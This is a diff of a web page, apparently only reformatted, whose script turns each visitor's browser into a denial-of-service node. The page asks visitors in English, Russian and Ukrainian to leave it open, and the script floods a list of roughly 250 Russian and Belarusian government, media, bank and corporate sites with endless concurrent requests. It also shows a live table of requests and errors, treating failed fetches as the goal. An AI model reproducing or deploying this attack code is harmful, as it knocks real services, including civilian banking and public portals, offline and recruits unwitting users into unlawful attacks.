@@ -2,426 +2,427 @@
 <html>
 
 <head>
-    <meta charset="UTF-8">
-    <title>Russia and Belarus HTML DoS</title>
+  <meta charset="UTF-8">
+  <title>Russia and Belarus HTML DoS</title>
 </head>
 
 <body>
 
-    <h1>Russia and Belarus HTML DoS</h1>
+  <h1>Russia and Belarus HTML DoS</h1>
 
-    <p>Reformatted from: <a href="https://stop-russian-desinformation.near.page">https://stop-russian-desinformation.near.page</a></p>
+  <p>Reformatted from: <a
+      href="https://stop-russian-desinformation.near.page">https://stop-russian-desinformation.near.page</a></p>
 
+  <table>
+    <thead>
+      <tr>
+        <th>English version</th>
+        <th>Русская версия</th>
+        <th>Українська версія</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>
+          <p>For security concerns, you are able to simply save the webpage, and run locally - as well as view
+            the source. It is entirely HTML and browser interpreted.</p>
+          <p>The "official" news in the Russian Federation and Belarus is all fake and we believe it is
+            better to shut them down! The government sites and banks are also taking a hit!</p>
+          <p>Please, just open this page and let it be open on your devices, it will flood the websites and
+            pose a huge load on their infrastructure.</p>
+          <p>Your browser will be slow. It's ok, don't worry and keep it run.</p>
+          <p>A small contribution from each of us will save Ukraine 🙏</p>
+        </td>
+        <td>
+          <p>«Официальные» новости в РФ полны пропаганды и транслируют лживую информацию о событиях на Украине. Мы
+            считаем, что лучше их закрыть и позволить людям переключиться на достоверные новости.</p>
+          <p>Пожалуйста, просто откройте эту страницу на своём компьютере и оставтье вкладку открытой, она будет
+            автоматически нагружать сайты российской пропаганды.</p>
+          <p>Ваш браузер будет работать медленно. Все в порядке, не волнуйтесь и держите его открытым.</p>
+          <p>Небольшой вклад каждого из нас спасет Украину 🙏</p>
+        </td>
+        <td>
+          <p>«Офіційні» новини в РФ сповнені пропаганди та транслюють брехливу інформацію про події в Україні. Ми
+            вважаємо, що краще їх закрити та дозволити людям переключитися на достовірні новини.</p>
+          <p>Будь ласка, відкрийте цю сторінку на вашому пристрої. Це закидає російські пропагандистські сайти запитами
+            та створить величезне навантаження на їхню інфраструктуру.</p>
+          <p>Ваш браузер працюватиме повільно. Все гаразд, не хвилюйтеся та тримайте його відкритим.</p>
+          <p>Невеликий внесок кожного з нас врятує Україну 🙏</p>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+
+  <p class="desc">Below are the stats of your session (URLs and requests that were sent from your browser)<br>
+    Sites with the "Failed to fetch" error message are dropping packets due to heavy load, which is the goal!<br>
+    A high number of errored responses may be due to a DDoS protection service.</p>
+
+  <div>
     <table>
-        <thead>
-            <tr>
-                <th>English version</th>
-                <th>Русская версия</th>
-                <th>Українська версія</th>
-            </tr>
-        </thead>
-        <tbody>
-            <tr>
-                <td>
-                    <p>For security concerns, you are able to simply save the webpage, and run locally - as well as view
-                        the source. It is entirely HTML and browser interpreted.</p>
-                    <p>The "official" news in the Russian Federation and Belarus is all fake and we believe it is
-                        better to shut them down! The government sites and banks are also taking a hit!</p>
-                    <p>Please, just open this page and let it be open on your devices, it will flood the websites and
-                        pose a huge load on their infrastructure.</p>
-                    <p>Your browser will be slow. It's ok, don't worry and keep it run.</p>
-                    <p>A small contribution from each of us will save Ukraine 🙏</p>
-                </td>
-                <td>
-                    <p>«Официальные» новости в РФ полны пропаганды и транслируют лживую информацию о событиях на Украине. Мы
-                        считаем, что лучше их закрыть и позволить людям переключиться на достоверные новости.</p>
-                    <p>Пожалуйста, просто откройте эту страницу на своём компьютере и оставтье вкладку открытой, она будет
-                        автоматически нагружать сайты российской пропаганды.</p>
-                    <p>Ваш браузер будет работать медленно. Все в порядке, не волнуйтесь и держите его открытым.</p>
-                    <p>Небольшой вклад каждого из нас спасет Украину 🙏</p>
-                </td>
-                <td>
-                    <p>«Офіційні» новини в РФ сповнені пропаганди та транслюють брехливу інформацію про події в Україні. Ми
-                        вважаємо, що краще їх закрити та дозволити людям переключитися на достовірні новини.</p>
-                    <p>Будь ласка, відкрийте цю сторінку на вашому пристрої. Це закидає російські пропагандистські сайти запитами
-                        та створить величезне навантаження на їхню інфраструктуру.</p>
-                    <p>Ваш браузер працюватиме повільно. Все гаразд, не хвилюйтеся та тримайте його відкритим.</p>
-                    <p>Невеликий внесок кожного з нас врятує Україну 🙏</p>
-                </td>
-            </tr>
-        </tbody>
+      <thead>
+        <tr>
+          <th>URL</th>
+          <th>Number of Requests</th>
+          <th>Number of Errors</th>
+          <th>Error Message</th>
+        </tr>
+      </thead>
+      <tbody id="stats"></tbody>
     </table>
+  </div>
 
-    <p class="desc">Below are the stats of your session (URLs and requests that were sent from your browser)<br>
-        Sites with the "Failed to fetch" error message are dropping packets due to heavy load, which is the goal!<br>
-        A high number of errored responses may be due to a DDoS protection service.</p>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: fixed linear-gradient(0deg, #ffd700 50%, #0057b7 50%) no-repeat;
+    }
 
-    <div>
-        <table>
-            <thead>
-                <tr>
-                    <th>URL</th>
-                    <th>Number of Requests</th>
-                    <th>Number of Errors</th>
-                    <th>Error Message</th>
-                </tr>
-            </thead>
-            <tbody id="stats"></tbody>
-        </table>
-    </div>
+    h1 {
+      margin: 2rem;
+      text-align: center;
+    }
 
-    <style>
-        body {
-            margin: 0;
-            font-family: Arial, sans-serif;
-            background: fixed linear-gradient(0deg, #ffd700 50%, #0057b7 50%) no-repeat;
+    body>p {
+      margin: 1rem;
+    }
+
+    table {
+      width: 100%;
+    }
+
+    body>table>thead>tr>th {
+      width: 33%;
+      font-size: x-large;
+    }
+
+    body>table>tbody>tr>td {
+      padding: 1rem;
+    }
+
+    .desc {
+      margin: 2rem;
+      font-weight: bold;
+      text-align: center;
+    }
+
+    div {
+      margin: 1rem;
+    }
+  </style>
+
+  <script>
+    var targetList = [
+      'http://20.kremlin.ru/',
+      'http://belres.by/',
+      'http://belta.by/',
+      'http://en.kremlin.ru/',
+      'http://government.ru/',
+      'http://kremlin.ru/',
+      'http://newletters.kremlin.ru/',
+      'http://www.bellegprom.by/',
+      'http://www.ctv.by/',
+      'http://www.kgb.by/',
+      'http://www.mil.by/',
+      'https://1tv.ru',
+      'https://20.kremlin.ru/',
+      'https://24paybank.ne',
+      'https://abcobmen.com/',
+      'https://abr.ru/',
+      'https://absolutbank.ru/',
+      'https://ai-bank.ru/',
+      'https://albank.ru/ru/',
+      'https://alfabank.com/',
+      'https://alfaradio.by/',
+      'https://altbb.ru/',
+      'https://api.sberbank.ru/prod/tokens/v2/oauth',
+      'https://api.sberbank.ru/prod/tokens/v2/oidc',
+      'https://assotsiatsiyabank.ru/',
+      'https://baikalrosbank.ru/',
+      'https://baksman.org/',
+      'https://bank-arzamas.ru/',
+      'https://bank.yandex.ru/',
+      'https://bankdabrabyt.by/',
+      'https://belarus.by/',
+      'https://belarus24.by/',
+      'https://belarusbank.by/',
+      'https://belmarket.by/',
+      'https://belres.by/',
+      'https://betatransfer.org',
+      'https://bezformata.com/',
+      'https://bgb.by/',
+      'https://bisr.gov.by/',
+      'https://bitokk.biz/',
+      'https://bonkypay.com/',
+      'https://brrb.by/',
+      'https://byrich.ru/',
+      'https://ca.gisca.ru',
+      'https://ca.kamgov.ru',
+      'https://ca.ntssoft.ru',
+      'https://capitalbank.ru/',
+      'https://cashbank.pro/',
+      'https://cfmc.ru',
+      'https://changer.club/',
+      'https://cleanbtc.ru/',
+      'https://cloud.rkn.gov.ru/',
+      'https://coinpaymaster.com/',
+      'https://constitution.kremlin.ru/',
+      'https://customs.gov.ru/',
+      'https://delets.cash/',
+      'https://dreamkas.ru',
+      'https://elkursk.ru',
+      'https://energo.by/',
+      'https://epnow.ru',
+      'https://er.ru/',
+      'https://eurosib.ru/',
+      'https://evraz.com/ru/',
+      'https://flashobmen.com/',
+      'https://fsb.ru',
+      'https://gazeta.ru/',
+      'https://gazprom.ru/',
+      'https://gazprombank.ru/',
+      'https://gosuslugi.astrobl.ru',
+      'https://gosuslugi.ru/',
+      'https://gosuslugi29.ru',
+      'https://gosuslugi41.ru',
+      'https://government.ru/',
+      'https://grodnonews.by/',
+      'https://iecp.ru/ep/ep-verification',
+      'https://iecp.ru/ep/uc-list',
+      'https://imctax.parus-s.ru',
+      'https://iz.ru/',
+      'https://izhtender.ru',
+      'https://kommersant.ru/',
+      'https://kp.ru/',
+      'https://kraskript.com',
+      'https://kremlin.ru/',
+      'https://kupibit.me/',
+      'https://lenta.ru/',
+      'https://lukoil.ru/',
+      'https://magnit.ru/',
+      'https://mail.rkn.gov.ru/',
+      'https://mascom-it.ru',
+      'https://mcs.mail.ru',
+      'https://mcspro.ru',
+      'https://metalloinvest.com/',
+      'https://mil.by',
+      'https://mil.ru/',
+      'https://mine.exchange/',
+      'https://minsknews.by/',
+      'https://mintrans.gov.by/',
+      'https://mk.ru/',
+      'https://mos.ru/uslugi',
+      'https://multichange.net/',
+      'https://mvd.gov.ru/',
+      'https://nalog.gov.ru/',
+      'https://nangs.org/',
+      'https://nbrb.by/',
+      'https://nlmk.com/',
+      'https://nornickel.com/',
+      'https://norvikbank.ru/',
+      'https://oac.gov.by/',
+      'https://omk.ru/',
+      'https://online.sberbank.ru/',
+      'https://ont.by/',
+      'https://pfr.gov.ru/',
+      'https://pikabu.ru/',
+      'https://platov.co',
+      'https://polymetalinternational.com/ru/',
+      'https://president.gov.by',
+      'https://president.gov.by/en',
+      'https://prokuratura.gov.by',
+      'https://prostocash.com/',
+      'https://proverki.gov.ru/',
+      'https://pwd.wto.economy.gov.ru/',
+      'https://radiobrestfm.by/',
+      'https://radiomir.by/',
+      'https://radiostalica.by/',
+      'https://ramon.money/',
+      'https://rbc.ru/',
+      'https://rec.gov.by/',
+      'https://relcom.ru',
+      'https://ria.ru/',
+      'https://ria.ru/lenta/',
+      'https://riafan.ru/',
+      'https://rk72.ru',
+      'https://rkn.gov.ru/',
+      'https://rmk-group.ru/ru/',
+      'https://roe.ru',
+      'https://royal.cash/',
+      'https://rsbis.ru/elektronnaya-podpis',
+      'https://rusvesna.su/',
+      'https://rzdlog.ru/',
+      'https://sb.by/',
+      'https://sberbank.ru/',
+      'https://severstal.com/',
+      'https://shop-rt.com/',
+      'https://sibur.ru/',
+      'https://smotrim.ru/',
+      'https://sputnik.by/',
+      'https://squaretrade.ru',
+      'https://stroi.gov.ru/',
+      'https://structure.mil.ru/structure/uc/info.htm',
+      'https://superchange.net',
+      'https://surgutneftegas.ru/',
+      'https://tass.ru/',
+      'https://tatneft.ru/',
+      'https://tmk-group.ru/',
+      'https://tvzvezda.ru/',
+      'https://uc-osnovanie.ru/',
+      'https://ucestp.ru',
+      'https://udcs.ru',
+      'https://ugmk.ua/',
+      'https://ukraina.ru/',
+      'https://uralkali.com/ru/',
+      'https://uslugi27.ru',
+      'https://vgtrk.ru/',
+      'https://vsoloviev.ru/',
+      'https://vtb.ru/',
+      'https://ww-pay.net/',
+      'https://www.1tv.ru/',
+      'https://www.24ecp.ru',
+      'https://www.agroros.ru/',
+      'https://www.ak-bars.ru/',
+      'https://www.akcia-bank.ru/',
+      'https://www.aksonbank.ru/',
+      'https://www.aktivbank.ru/',
+      'https://www.alefbank.ru/',
+      'https://www.alexbank.ru/',
+      'https://www.andjibank.ru/',
+      'https://www.aresbank.ru/',
+      'https://www.aspectbank.ru/',
+      'https://www.astralnalog.ru',
+      'https://www.atb.su/',
+      'https://www.autokreditbank.ru/',
+      'https://www.avangard.ru/rus/',
+      'https://www.avtogradbank.ru/',
+      'https://www.belapb.by/',
+      'https://www.belinfonalog.ru',
+      'https://www.belneftekhim.by/',
+      'https://www.center-inform.ru',
+      'https://www.cit-ufa.ru',
+      'https://www.crimea.kp.ru/',
+      'https://www.crypset.ru',
+      'https://www.e-portal.ru',
+      'https://www.eurosib.ru/',
+      'https://www.evraz.com/ru/',
+      'https://www.gazeta.ru/',
+      'https://www.gazprom.ru/',
+      'https://www.gazprombank.ru/',
+      'https://www.gosuslugi.ru/',
+      'https://www.icentr.ru',
+      'https://www.icvibor.ru',
+      'https://www.infotrust.ru',
+      'https://www.interfax.ru/',
+      'https://www.kartoteka.ru',
+      'https://www.kommersant.ru/',
+      'https://www.kt-69.ru',
+      'https://www.metalloinvest.com/',
+      'https://www.mfa.gov.by',
+      'https://www.mfk-bank.ru/',
+      'https://www.mininform.gov.by',
+      'https://www.mk.ru/',
+      'https://www.mos.ru/uslugi/',
+      'https://www.mpt.gov.by/',
+      'https://www.mvd.gov.by',
+      'https://www.nalog.gov.ru/',
+      'https://www.nbrb.by/',
+      'https://www.netex24.net',
+      'https://www.nornickel.com/',
+      'https://www.nucrf.ru/',
+      'https://www.nwudc.ru',
+      'https://www.open.ru/',
+      'https://www.otchet-online.ru',
+      'https://www.polymetalinternational.com/ru/',
+      'https://www.raiffeisen.ru/',
+      'https://www.rbc.ru/',
+      'https://www.rcarus.ru',
+      'https://www.roseltorg.ru',
+      'https://www.rt.com/',
+      'https://www.rzd.ru/',
+      'https://www.sb.by/',
+      'https://www.sberbank.ru/',
+      'https://www.severstal.com/',
+      'https://www.sibur.ru/',
+      'https://www.stv-it.ru',
+      'https://www.surgutneftegas.ru/',
+      'https://www.tatneft.ru/',
+      'https://www.tmk-group.ru/',
+      'https://www.tvr.by/',
+      'https://www.tvrmogilev.by/',
+      'https://www.ucpir.ru',
+      'https://www.unicreditbank.ru/',
+      'https://www.uralkali.com/ru/',
+      'https://www.vedomosti.ru/',
+      'https://www.vesti.ru/',
+      'https://www.vtb.ru/',
+      'https://www.y-center.ru',
+      'https://www.zemsky.ru/',
+      'https://ya.ru/',
+      'https://yandex.by/',
+      'https://yandex.ru/',
+      'https://yaplakal.com/',
+      'https://ychanger.net/',
+      'https://zakupki.gov.ru/',
+      'https://zarya.by/',
+      'https:/kk.bank/UdTs',
+    ]
+    var targetStats = {}; targetList.forEach(target => { targetStats[target] = { number_of_requests: 0, number_of_errored_responses: 0, error_message: '' } })
+    var total_requests = 0
+    var total_errors = 0
+    var CONCURRENCY_LIMIT = 1000
+    var queue = []
+
+    // Start
+    targetList.map(flood)
+
+    // Update stats
+    setInterval(() => {
+      document.getElementById('stats').innerHTML = Object.entries(targetStats).map(([target, { number_of_requests, number_of_errored_responses, error_message }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td><td>' + error_message + '</td></tr>').join('') + `<tr><td style="font-weight:bold">Total Stats:</td><td>${total_requests}</td><td>${total_errors}</td><td></td></tr>`
+    }, 1000)
+
+    async function flood(target) {
+      while (true) {
+        if (queue.length > CONCURRENCY_LIMIT) {
+          await queue.shift()
         }
-
-        h1 {
-            margin: 2rem;
-            text-align: center;
-        }
-
-        body>p {
-            margin: 1rem;
-        }
-
-        table {
-            width: 100%;
-        }
-
-        body>table>thead>tr>th {
-            width: 33%;
-            font-size: x-large;
-        }
-
-        body>table>tbody>tr>td {
-            padding: 1rem;
-        }
-
-        .desc {
-            margin: 2rem;
-            font-weight: bold;
-            text-align: center;
-        }
-
-        div {
-            margin: 1rem;
-        }
-    </style>
-
-    <script>
-        var targetList = [
-            'http://20.kremlin.ru/',
-            'http://belres.by/',
-            'http://belta.by/',
-            'http://en.kremlin.ru/',
-            'http://government.ru/',
-            'http://kremlin.ru/',
-            'http://newletters.kremlin.ru/',
-            'http://www.bellegprom.by/',
-            'http://www.ctv.by/',
-            'http://www.kgb.by/',
-            'http://www.mil.by/',
-            'https://1tv.ru',
-            'https://20.kremlin.ru/',
-            'https://24paybank.ne',
-            'https://abcobmen.com/',
-            'https://abr.ru/',
-            'https://absolutbank.ru/',
-            'https://ai-bank.ru/',
-            'https://albank.ru/ru/',
-            'https://alfabank.com/',
-            'https://alfaradio.by/',
-            'https://altbb.ru/',
-            'https://api.sberbank.ru/prod/tokens/v2/oauth',
-            'https://api.sberbank.ru/prod/tokens/v2/oidc',
-            'https://assotsiatsiyabank.ru/',
-            'https://baikalrosbank.ru/',
-            'https://baksman.org/',
-            'https://bank-arzamas.ru/',
-            'https://bank.yandex.ru/',
-            'https://bankdabrabyt.by/',
-            'https://belarus.by/',
-            'https://belarus24.by/',
-            'https://belarusbank.by/',
-            'https://belmarket.by/',
-            'https://belres.by/',
-            'https://betatransfer.org',
-            'https://bezformata.com/',
-            'https://bgb.by/',
-            'https://bisr.gov.by/',
-            'https://bitokk.biz/',
-            'https://bonkypay.com/',
-            'https://brrb.by/',
-            'https://byrich.ru/',
-            'https://ca.gisca.ru',
-            'https://ca.kamgov.ru',
-            'https://ca.ntssoft.ru',
-            'https://capitalbank.ru/',
-            'https://cashbank.pro/',
-            'https://cfmc.ru',
-            'https://changer.club/',
-            'https://cleanbtc.ru/',
-            'https://cloud.rkn.gov.ru/',
-            'https://coinpaymaster.com/',
-            'https://constitution.kremlin.ru/',
-            'https://customs.gov.ru/',
-            'https://delets.cash/',
-            'https://dreamkas.ru',
-            'https://elkursk.ru',
-            'https://energo.by/',
-            'https://epnow.ru',
-            'https://er.ru/',
-            'https://eurosib.ru/',
-            'https://evraz.com/ru/',
-            'https://flashobmen.com/',
-            'https://fsb.ru',
-            'https://gazeta.ru/',
-            'https://gazprom.ru/',
-            'https://gazprombank.ru/',
-            'https://gosuslugi.astrobl.ru',
-            'https://gosuslugi.ru/',
-            'https://gosuslugi29.ru',
-            'https://gosuslugi41.ru',
-            'https://government.ru/',
-            'https://grodnonews.by/',
-            'https://iecp.ru/ep/ep-verification',
-            'https://iecp.ru/ep/uc-list',
-            'https://imctax.parus-s.ru',
-            'https://iz.ru/',
-            'https://izhtender.ru',
-            'https://kommersant.ru/',
-            'https://kp.ru/',
-            'https://kraskript.com',
-            'https://kremlin.ru/',
-            'https://kupibit.me/',
-            'https://lenta.ru/',
-            'https://lukoil.ru/',
-            'https://magnit.ru/',
-            'https://mail.rkn.gov.ru/',
-            'https://mascom-it.ru',
-            'https://mcs.mail.ru',
-            'https://mcspro.ru',
-            'https://metalloinvest.com/',
-            'https://mil.by',
-            'https://mil.ru/',
-            'https://mine.exchange/',
-            'https://minsknews.by/',
-            'https://mintrans.gov.by/',
-            'https://mk.ru/',
-            'https://mos.ru/uslugi',
-            'https://multichange.net/',
-            'https://mvd.gov.ru/',
-            'https://nalog.gov.ru/',
-            'https://nangs.org/',
-            'https://nbrb.by/',
-            'https://nlmk.com/',
-            'https://nornickel.com/',
-            'https://norvikbank.ru/',
-            'https://oac.gov.by/',
-            'https://omk.ru/',
-            'https://online.sberbank.ru/',
-            'https://ont.by/',
-            'https://pfr.gov.ru/',
-            'https://pikabu.ru/',
-            'https://platov.co',
-            'https://polymetalinternational.com/ru/',
-            'https://president.gov.by',
-            'https://president.gov.by/en',
-            'https://prokuratura.gov.by',
-            'https://prostocash.com/',
-            'https://proverki.gov.ru/',
-            'https://pwd.wto.economy.gov.ru/',
-            'https://radiobrestfm.by/',
-            'https://radiomir.by/',
-            'https://radiostalica.by/',
-            'https://ramon.money/',
-            'https://rbc.ru/',
-            'https://rec.gov.by/',
-            'https://relcom.ru',
-            'https://ria.ru/',
-            'https://ria.ru/lenta/',
-            'https://riafan.ru/',
-            'https://rk72.ru',
-            'https://rkn.gov.ru/',
-            'https://rmk-group.ru/ru/',
-            'https://roe.ru',
-            'https://royal.cash/',
-            'https://rsbis.ru/elektronnaya-podpis',
-            'https://rusvesna.su/',
-            'https://rzdlog.ru/',
-            'https://sb.by/',
-            'https://sberbank.ru/',
-            'https://severstal.com/',
-            'https://shop-rt.com/',
-            'https://sibur.ru/',
-            'https://smotrim.ru/',
-            'https://sputnik.by/',
-            'https://squaretrade.ru',
-            'https://stroi.gov.ru/',
-            'https://structure.mil.ru/structure/uc/info.htm',
-            'https://superchange.net',
-            'https://surgutneftegas.ru/',
-            'https://tass.ru/',
-            'https://tatneft.ru/',
-            'https://tmk-group.ru/',
-            'https://tvzvezda.ru/',
-            'https://uc-osnovanie.ru/',
-            'https://ucestp.ru',
-            'https://udcs.ru',
-            'https://ugmk.ua/',
-            'https://ukraina.ru/',
-            'https://uralkali.com/ru/',
-            'https://uslugi27.ru',
-            'https://vgtrk.ru/',
-            'https://vsoloviev.ru/',
-            'https://vtb.ru/',
-            'https://ww-pay.net/',
-            'https://www.1tv.ru/',
-            'https://www.24ecp.ru',
-            'https://www.agroros.ru/',
-            'https://www.ak-bars.ru/',
-            'https://www.akcia-bank.ru/',
-            'https://www.aksonbank.ru/',
-            'https://www.aktivbank.ru/',
-            'https://www.alefbank.ru/',
-            'https://www.alexbank.ru/',
-            'https://www.andjibank.ru/',
-            'https://www.aresbank.ru/',
-            'https://www.aspectbank.ru/',
-            'https://www.astralnalog.ru',
-            'https://www.atb.su/',
-            'https://www.autokreditbank.ru/',
-            'https://www.avangard.ru/rus/',
-            'https://www.avtogradbank.ru/',
-            'https://www.belapb.by/',
-            'https://www.belinfonalog.ru',
-            'https://www.belneftekhim.by/',
-            'https://www.center-inform.ru',
-            'https://www.cit-ufa.ru',
-            'https://www.crimea.kp.ru/',
-            'https://www.crypset.ru',
-            'https://www.e-portal.ru',
-            'https://www.eurosib.ru/',
-            'https://www.evraz.com/ru/',
-            'https://www.gazeta.ru/',
-            'https://www.gazprom.ru/',
-            'https://www.gazprombank.ru/',
-            'https://www.gosuslugi.ru/',
-            'https://www.icentr.ru',
-            'https://www.icvibor.ru',
-            'https://www.infotrust.ru',
-            'https://www.interfax.ru/',
-            'https://www.kartoteka.ru',
-            'https://www.kommersant.ru/',
-            'https://www.kt-69.ru',
-            'https://www.metalloinvest.com/',
-            'https://www.mfa.gov.by',
-            'https://www.mfk-bank.ru/',
-            'https://www.mininform.gov.by',
-            'https://www.mk.ru/',
-            'https://www.mos.ru/uslugi/',
-            'https://www.mpt.gov.by/',
-            'https://www.mvd.gov.by',
-            'https://www.nalog.gov.ru/',
-            'https://www.nbrb.by/',
-            'https://www.netex24.net',
-            'https://www.nornickel.com/',
-            'https://www.nucrf.ru/',
-            'https://www.nwudc.ru',
-            'https://www.open.ru/',
-            'https://www.otchet-online.ru',
-            'https://www.polymetalinternational.com/ru/',
-            'https://www.raiffeisen.ru/',
-            'https://www.rbc.ru/',
-            'https://www.rcarus.ru',
-            'https://www.roseltorg.ru',
-            'https://www.rt.com/',
-            'https://www.rzd.ru/',
-            'https://www.sb.by/',
-            'https://www.sberbank.ru/',
-            'https://www.severstal.com/',
-            'https://www.sibur.ru/',
-            'https://www.stv-it.ru',
-            'https://www.surgutneftegas.ru/',
-            'https://www.tatneft.ru/',
-            'https://www.tmk-group.ru/',
-            'https://www.tvr.by/',
-            'https://www.tvrmogilev.by/',
-            'https://www.ucpir.ru',
-            'https://www.unicreditbank.ru/',
-            'https://www.uralkali.com/ru/',
-            'https://www.vedomosti.ru/',
-            'https://www.vesti.ru/',
-            'https://www.vtb.ru/',
-            'https://www.y-center.ru',
-            'https://www.zemsky.ru/',
-            'https://ya.ru/',
-            'https://yandex.by/',
-            'https://yandex.ru/',
-            'https://yaplakal.com/',
-            'https://ychanger.net/',
-            'https://zakupki.gov.ru/',
-            'https://zarya.by/',
-            'https:/kk.bank/UdTs',
-        ]
-        var targetStats = {}; targetList.forEach(target => { targetStats[target] = { number_of_requests: 0, number_of_errored_responses: 0, error_message: '' } })
-        var total_requests = 0
-        var total_errors = 0
-        var CONCURRENCY_LIMIT = 1000
-        var queue = []
-
-        // Start
-        targetList.map(flood)
-
-        // Update stats
-        setInterval(() => {
-            document.getElementById('stats').innerHTML = Object.entries(targetStats).map(([target, { number_of_requests, number_of_errored_responses, error_message }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td><td>' + error_message + '</td></tr>').join('') + `<tr><td style="font-weight:bold">Total Stats:</td><td>${total_requests}</td><td>${total_errors}</td><td></td></tr>`
-        }, 1000)
-
-        async function flood(target) {
-            while (true) {
-                if (queue.length > CONCURRENCY_LIMIT) {
-                    await queue.shift()
-                }
-                queue.push(
-                    fetchWithTimeout(target, { timeout: 1000 })
-                        .catch((error) => {
-                            if (error.code === 20) { return } // ABORT
-                            targetStats[target].number_of_errored_responses++
-                            targetStats[target].error_message = error.message
-                            total_errors++
-                        })
-                        .then((response) => {
-                            if (response && !response.ok) {
-                                targetStats[target].number_of_errored_responses++
-                                targetStats[target].error_message = response.statusText
-                                total_errors++
-                            }
-                            targetStats[target].number_of_requests++
-                            total_requests++
-                        })
-                )
-            }
-        }
-
-        async function fetchWithTimeout(resource, options) {
-            const controller = new AbortController()
-            const id = setTimeout(() => controller.abort(), options.timeout)
-            return fetch(resource, {
-                method: 'GET',
-                mode: 'no-cors',
-                signal: controller.signal
-            }).then((response) => {
-                clearTimeout(id)
-                return response
-            }).catch((error) => {
-                clearTimeout(id)
-                throw error
+        queue.push(
+          fetchWithTimeout(target, { timeout: 1000 })
+            .catch((error) => {
+              if (error.code === 20) { return } // ABORT
+              targetStats[target].number_of_errored_responses++
+              targetStats[target].error_message = error.message
+              total_errors++
             })
-        }
-    </script>
+            .then((response) => {
+              if (response && !response.ok) {
+                targetStats[target].number_of_errored_responses++
+                targetStats[target].error_message = response.statusText
+                total_errors++
+              }
+              targetStats[target].number_of_requests++
+              total_requests++
+            })
+        )
+      }
+    }
+
+    async function fetchWithTimeout(resource, options) {
+      const controller = new AbortController()
+      const id = setTimeout(() => controller.abort(), options.timeout)
+      return fetch(resource, {
+        method: 'GET',
+        mode: 'no-cors',
+        signal: controller.signal
+      }).then((response) => {
+        clearTimeout(id)
+        return response
+      }).catch((error) => {
+        clearTimeout(id)
+        throw error
+      })
+    }
+  </script>
 
 </body>
 
